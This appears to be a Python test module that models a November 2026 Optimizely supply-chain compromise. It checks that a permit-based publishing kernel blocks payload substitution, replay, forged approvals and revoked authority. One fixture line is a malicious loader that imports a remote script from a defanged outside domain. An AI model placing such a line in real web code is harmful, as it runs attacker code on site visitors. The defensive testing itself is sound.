"""Scenario test: the November 2026 Optimizely supply-chain compromise
(campaign name OPTIMJACK in the Cato Networks and SecurityAffairs
write-ups), modeled against the canonical kernel API.

Incident (Recorded, from Report URI's published disclosure by Scott
Helme, 2026-11-16, and Optimizely's own confirmation): an unauthorized
party exploited a vulnerability in Optimizely's Experimentation
account signup flow — per Cato's analysis of Optimizely's incident
report, the flaw allowed administrator impersonation and unauthorized
changes to Project JavaScript without stolen customer passwords — and
injected a malicious loader into the Project JavaScript of customer
projects. Report URI examined 1,611 Optimizely snippets and found 188
infected snippets belonging to 178 organizations (including Zoom, the
BBC, CNN, Salesforce, GitLab, IKEA, HSBC, and Equifax). Because every
affected site loads its snippet from Optimizely's CDN, the code was
served from a trusted host with a valid certificate to each site's
visitors for most of 16 November 2026 (first injection observed
04:21 UTC; the last infected snippet was clean by 23:11 UTC per
Report URI). The payload swapped cryptocurrency wallet addresses,
skimmed payment cards, stole cookies and screenshots, and delivered
the Coruna and DarkSword iOS exploit kits; Report URI counted about
$7,040 in attacker wallets by 19:25 UTC. None of the 178
organizations was breached directly: the consequential act was a
single class of write — publish Project JavaScript — executed
through a trusted distribution path, by a party whose platform
access was real but whose authority over those projects' code was
not.

This module does NOT reproduce Optimizely, the signup flaw, or any
payload. The "publisher" is this harness holding intents; the only
route from intent to served bytes is a successful
``GovernanceKernel.consume`` of a permit bound to the exact intent
hash, and the intent names the content by its SHA-256 hash — the
permit binds the project AND the exact bytes to be served, not the
target and a declared size alone. (That binding choice is the
modeling lesson of the 2026-11-18 governed-write harness correction,
applied here from the start: a permit that binds target and cost but
not content does not bind the act.)

Setup A (approval path): the project owner approves publishes of
exact content. The incident's acts are then attempted: a publish
with no permit, the malicious payload substituted under the benign
publish's permit, the benign permit presented against a different
project, replay of the spent permit, and a forged approval for the
malicious publish. An independent observer — which reads the served
store directly and never asks the kernel what happened, the role
Report URI played in the incident — reconciles the platform's
publish claims against the observed served bytes in both
directions.

Setup B (directive path): the platform publishes under the project
owner's standing directive. A publish permit is issued under it;
the owner then revokes the directive (incident response). The
previously issued, unconsumed permit must fail at consume with the
directive recorded as revoked, and a directive-issued permit must
not spend on substituted content.

Boundary: this proves kernel behavior at this commit for this
action class (Verified, executable evidence). It proves nothing
about Optimizely's systems, identity proofing at signup (the
scenario grants the attacker a platform session and shows the
session is insufficient — it does not model fixing signup), or
visitor-side behavior of legitimately published code. A platform
that does not route its publishes through the gate is governed by
nothing here: a control not on the execution path governs nothing.

Adversarial transformation review: the full eight-pass review
(Flip, Reverse, Invert, Inside-Out, Darken, Lighten, Amplify,
Negate) for this incident is recorded in this scenario's pull
request per ``docs/ADVERSARIAL_TRANSFORMATION_SOP.md``.
Stop/continue decision: CONTINUE in the governed kernel path
only — exactly the owner-approved publishes are permitted, and
any non-kernel publish path (the known direct-writer class)
remains outside this evidence and open.

Audit-growth classification (per AGENTS.md, ``NO_PERMIT !=
NO_GOVERNED_EFFECT``): each denied attempt appends exactly one
audit record — a governed effect (evidence production), bounded
at one record per attempt, append-only, ``authority_effect=none``.
"Consequence" below means governed external consequence — bytes
actually served by the store — never audit growth.
"""

from __future__ import annotations

import hashlib
import unittest

from pulpo import GovernanceKernel, Intent, Policy
from pulpo.directives import (
    DirectiveAuthorityController,
    GovernedDirectiveProjection,
)
from pulpo.state import InMemoryKernelState
from tests.authority_support import HmacTestVerifier, signed_envelope, trust_for
from tests.test_directives import OPERATOR, directive


NOW = 3_000_000
AGENT = "agent:publish-pipeline"
SESSION = "optimjack-2026-11"

PROJECT = "project:brand-storefront"
OTHER_PROJECT = "project:brand-outlet"

BENIGN = b"/* project-js v41 | experiments + analytics | owner-approved */"
MALICIOUS = b"/* project-js v41 */ import('https://1688360[.]cc/track.js');"

ACTIONS = frozenset({"publish_project_js"})


def intent_for(project: str, content: bytes) -> Intent:
    """The publish intent names the project AND the exact bytes by hash."""
    digest = hashlib.sha256(content).hexdigest()
    return Intent(
        AGENT,
        "publish_project_js",
        f"{project}#sha256={digest}",
        len(content),
        SESSION,
    )


class ServedStore:
    """What the platform actually serves per project — the consequence
    surface. Bytes change only through a successful consume."""

    def __init__(self) -> None:
        self.served: dict[str, bytes] = {}

    def publish(
        self,
        kernel: GovernanceKernel,
        permit: str | None,
        intent: Intent,
        project: str,
        content: bytes,
    ) -> bool:
        if permit is None:
            return False
        if not kernel.consume(permit, intent):
            return False
        self.served[project] = content
        return True


def observe(store: ServedStore) -> dict[str, str]:
    """The independent observer: reads served bytes directly, hashes
    them, and never consults the kernel or the platform's claims."""
    return {
        project: hashlib.sha256(content).hexdigest()
        for project, content in sorted(store.served.items())
    }


def reconcile_served(observed: dict[str, str], claims: set[tuple[str, str]]) -> dict:
    """Test-level reconciliation, both directions stated explicitly
    (the PR #362 lesson): a publish claim is supported only by
    observed served bytes with the same hash (``claims - observed``
    must be empty — a claim with no served effect is a phantom
    claim), and served bytes with no supporting claim
    (``observed - claims``) are an unaccounted effect — the
    condition Report URI detected in the incident."""
    observed_items = set(observed.items())
    return {
        "ok": claims == observed_items,
        "phantom_claims": claims - observed_items,
        "unaccounted_effects": observed_items - claims,
    }


class _IntentBlindState(InMemoryKernelState):
    """Deliberately unguarded double for the negative control (see the
    canonical incident scenarios): its consume ignores the intent
    binding, so the substituted publish must EXECUTE under it,
    proving the scenario's denials come from the kernel's binding."""

    def consume_permit(self, permit: str, intent_hash: str, timestamp_ns: int) -> bool:
        valid = permit in self._issued and permit not in self._spent
        if valid:
            self._spent.add(permit)
        self.append(
            "permit_consumed" if valid else "permit_rejected",
            {"intent_hash": intent_hash},
            timestamp_ns,
        )
        return valid


class _UnguardedConsumeKernel(GovernanceKernel):
    """Deliberately unguarded kernel double for the negative control."""

    def consume(self, permit: str, intent: Intent) -> bool:
        return self._state.consume_permit(
            permit, self.intent_hash(intent), self._clock()
        )


class OptimjackApprovalPathTests(unittest.TestCase):
    def setUp(self) -> None:
        self.verifier = HmacTestVerifier()
        self.policy = Policy(
            ACTIONS,
            10_000,
            ACTIONS,
            authority_trust=trust_for(self.verifier),
        )
        self.kernel = self._kernel()
        self.store = ServedStore()

    def _kernel(self, state=None, *, kernel_class=GovernanceKernel) -> GovernanceKernel:
        kwargs = {} if state is None else {"state": state}
        return kernel_class(
            self.policy,
            secret=b"optimjack-scenario-kernel-secret",
            approval_verifier=self.verifier,
            clock=lambda: NOW,
            **kwargs,
        )

    def _issue(self, kernel: GovernanceKernel, intent: Intent) -> str:
        self._issue_count = getattr(self, "_issue_count", 0) + 1
        n = self._issue_count
        envelope = signed_envelope(
            kernel,
            intent,
            self.verifier,
            now_ns=NOW,
            approval_id=f"approval-{n}",
            nonce=f"approval-nonce-{n}",
        )
        decision = kernel.evaluate_with_approval(intent, envelope)
        self.assertEqual(("allow", "verified_approval"), (decision.outcome, decision.reason))
        self.assertIsNotNone(decision.permit)
        return decision.permit

    # -- positive control -------------------------------------------------

    def test_positive_control_owner_approved_publish_serves_exact_bytes_once(self) -> None:
        permit = self._issue(self.kernel, intent_for(PROJECT, BENIGN))
        self.assertTrue(
            self.store.publish(
                self.kernel, permit, intent_for(PROJECT, BENIGN), PROJECT, BENIGN
            )
        )
        self.assertEqual({PROJECT: BENIGN}, self.store.served)
        self.assertEqual(
            {PROJECT: hashlib.sha256(BENIGN).hexdigest()}, observe(self.store)
        )
        self.assertTrue(self.kernel.verify_audit())

    # -- step 1: publish with no permit ------------------------------------

    def test_step1_publish_without_permit_refused(self) -> None:
        self.assertFalse(
            self.store.publish(
                self.kernel, None, intent_for(PROJECT, BENIGN), PROJECT, BENIGN
            )
        )
        self.assertEqual({}, self.store.served)
        self.assertTrue(self.kernel.verify_audit())

    # -- step 2: substitution — malicious bytes under the benign permit ----

    def test_step2_substituted_payload_under_benign_permit_denied(self) -> None:
        permit = self._issue(self.kernel, intent_for(PROJECT, BENIGN))
        self.assertFalse(
            self.store.publish(
                self.kernel, permit, intent_for(PROJECT, MALICIOUS), PROJECT, MALICIOUS
            )
        )
        self.assertEqual({}, self.store.served)
        # The denial consumed nothing: the approved bytes still publish.
        self.assertTrue(
            self.store.publish(
                self.kernel, permit, intent_for(PROJECT, BENIGN), PROJECT, BENIGN
            )
        )
        self.assertEqual({PROJECT: BENIGN}, self.store.served)
        self.assertTrue(self.kernel.verify_audit())

    # -- step 2b: cross-project — one project's permit, another's shelf ----

    def test_step2b_permit_does_not_spend_on_another_project(self) -> None:
        permit = self._issue(self.kernel, intent_for(PROJECT, BENIGN))
        self.assertFalse(
            self.store.publish(
                self.kernel,
                permit,
                intent_for(OTHER_PROJECT, BENIGN),
                OTHER_PROJECT,
                BENIGN,
            )
        )
        self.assertEqual({}, self.store.served)
        self.assertTrue(
            self.store.publish(
                self.kernel, permit, intent_for(PROJECT, BENIGN), PROJECT, BENIGN
            )
        )
        self.assertEqual({PROJECT: BENIGN}, self.store.served)
        self.assertTrue(self.kernel.verify_audit())

    # -- step 3: replay of the spent publish permit -------------------------

    def test_step3_replay_of_spent_publish_permit_denied(self) -> None:
        permit = self._issue(self.kernel, intent_for(PROJECT, BENIGN))
        intent = intent_for(PROJECT, BENIGN)
        self.assertTrue(self.store.publish(self.kernel, permit, intent, PROJECT, BENIGN))
        self.assertFalse(self.store.publish(self.kernel, permit, intent, PROJECT, BENIGN))
        self.assertEqual({PROJECT: BENIGN}, self.store.served)
        self.assertTrue(self.kernel.verify_audit())

    # -- step 4: forged approval for the malicious publish ------------------

    def test_step4_forged_approval_for_malicious_publish_denied(self) -> None:
        attacker = HmacTestVerifier(b"attacker-authority-key")
        forged = signed_envelope(
            self.kernel, intent_for(PROJECT, MALICIOUS), attacker, now_ns=NOW
        )
        decision = self.kernel.evaluate_with_approval(
            intent_for(PROJECT, MALICIOUS), forged
        )
        self.assertNotEqual("allow", decision.outcome)
        self.assertIsNone(decision.permit)
        self.assertEqual({}, self.store.served)

    # -- step 5: reconciliation, both directions ----------------------------

    def test_step5_reconciliation_both_directions(self) -> None:
        permit = self._issue(self.kernel, intent_for(PROJECT, BENIGN))
        self.assertTrue(
            self.store.publish(
                self.kernel, permit, intent_for(PROJECT, BENIGN), PROJECT, BENIGN
            )
        )
        benign_claim = (PROJECT, hashlib.sha256(BENIGN).hexdigest())
        malicious_claim = (PROJECT, hashlib.sha256(MALICIOUS).hexdigest())

        # Governed run: claims and observed bytes agree exactly.
        result = reconcile_served(observe(self.store), {benign_claim})
        self.assertTrue(result["ok"])

        # A claim for a publish that never executed is a phantom claim.
        result = reconcile_served(observe(self.store), {benign_claim, malicious_claim})
        self.assertFalse(result["ok"])
        self.assertEqual({malicious_claim}, result["phantom_claims"])
        self.assertEqual(set(), result["unaccounted_effects"])

        # The incident's detection condition: bytes are being served
        # that no claim accounts for. Modeled by handing the observer
        # a store the governed path never wrote to.
        incident_store = ServedStore()
        incident_store.served[PROJECT] = MALICIOUS
        result = reconcile_served(observe(incident_store), {benign_claim})
        self.assertFalse(result["ok"])
        self.assertEqual({malicious_claim}, result["unaccounted_effects"])
        self.assertTrue(self.kernel.verify_audit())

    # -- negative control ---------------------------------------------------

    def test_negative_control_unguarded_kernel_serves_substituted_payload(self) -> None:
        kernel = self._kernel(_IntentBlindState(), kernel_class=_UnguardedConsumeKernel)
        store = ServedStore()
        permit = self._issue(kernel, intent_for(PROJECT, BENIGN))
        self.assertTrue(
            store.publish(
                kernel, permit, intent_for(PROJECT, MALICIOUS), PROJECT, MALICIOUS
            )
        )
        self.assertEqual({PROJECT: MALICIOUS}, store.served)


class OptimjackRevocationTests(unittest.TestCase):
    """Setup B: revocation of the owner's directive kills a previously
    issued, unconsumed publish permit at consume time, and a
    directive-issued permit does not spend on substituted content.

    The activation/revocation scaffolding mirrors DirectiveProofTests
    (tests/test_directives.py) by composition of the same public
    helpers, with the kernel policy's action set covering this
    scenario's action; it does not inherit that suite.
    """

    def _governed(self, state):
        verifier = HmacTestVerifier()
        policy = Policy(
            frozenset({"publish_project_js", "activate_directive", "revoke_directive"}),
            10_000,
            frozenset({"activate_directive", "revoke_directive"}),
            authority_trust=trust_for(verifier),
        )
        kernel = GovernanceKernel(
            policy,
            secret=b"optimjack-directive-scenario-secret",
            approval_verifier=verifier,
            clock=lambda: NOW,
            state=state,
        )
        return kernel, verifier

    def _directive(self):
        return directive(
            directive_id="storefront-publish-authority",
            principal=AGENT,
            allowed_actions=frozenset({"publish_project_js"}),
            resource_prefixes=(PROJECT,),
            max_cost=10_000,
            issued_at_ns=1_000_000,
            expires_at_ns=9_000_000,
        )

    def _approve(self, kernel, verifier, operation, d, approval_id, nonce):
        intent = DirectiveAuthorityController.authority_intent(
            operation, d, operator_principal=OPERATOR
        )
        return signed_envelope(
            kernel,
            intent,
            verifier,
            now_ns=NOW - 10,
            approval_id=approval_id,
            nonce=nonce,
        )

    def _activate(self, state, d):
        kernel, verifier = self._governed(state)
        controller = DirectiveAuthorityController(kernel)
        envelope = self._approve(
            kernel, verifier, controller.ACTIVATE, d, "activate-1", "activate-nonce-1"
        )
        decision = controller.activate(d, envelope, operator_principal=OPERATOR)
        self.assertEqual("allow", decision.outcome)
        return kernel, verifier, controller

    def test_revoked_directive_invalidates_issued_publish_permit(self) -> None:
        state = InMemoryKernelState()
        d = self._directive()
        kernel, verifier, controller = self._activate(state, d)
        projection = GovernedDirectiveProjection(kernel)
        decision = projection.evaluate(intent_for(PROJECT, BENIGN), d)
        self.assertEqual("allow", decision.outcome)
        self.assertIsNotNone(decision.permit)

        revoke_envelope = self._approve(
            kernel, verifier, controller.REVOKE, d, "revoke-1", "revoke-nonce-1"
        )
        revoke = controller.revoke(d, revoke_envelope, operator_principal=OPERATOR)
        self.assertEqual("allow", revoke.outcome)

        store = ServedStore()
        self.assertFalse(
            store.publish(
                kernel, decision.permit, intent_for(PROJECT, BENIGN), PROJECT, BENIGN
            )
        )
        self.assertEqual({}, store.served)
        rejected = [r for r in state.audit if r["event"] == "permit_rejected"][-1]
        self.assertEqual("directive_revoked", rejected["payload"]["directive_status"])

    def test_directive_permit_does_not_spend_on_substituted_content(self) -> None:
        state = InMemoryKernelState()
        d = self._directive()
        kernel, verifier, controller = self._activate(state, d)
        projection = GovernedDirectiveProjection(kernel)
        decision = projection.evaluate(intent_for(PROJECT, BENIGN), d)
        self.assertEqual("allow", decision.outcome)
        self.assertIsNotNone(decision.permit)

        store = ServedStore()
        self.assertFalse(
            store.publish(
                kernel,
                decision.permit,
                intent_for(PROJECT, MALICIOUS),
                PROJECT,
                MALICIOUS,
            )
        )
        self.assertEqual({}, store.served)
        self.assertTrue(
            store.publish(
                kernel, decision.permit, intent_for(PROJECT, BENIGN), PROJECT, BENIGN
            )
        )
        self.assertEqual({PROJECT: BENIGN}, store.served)


if __name__ == "__main__":
    unittest.main()
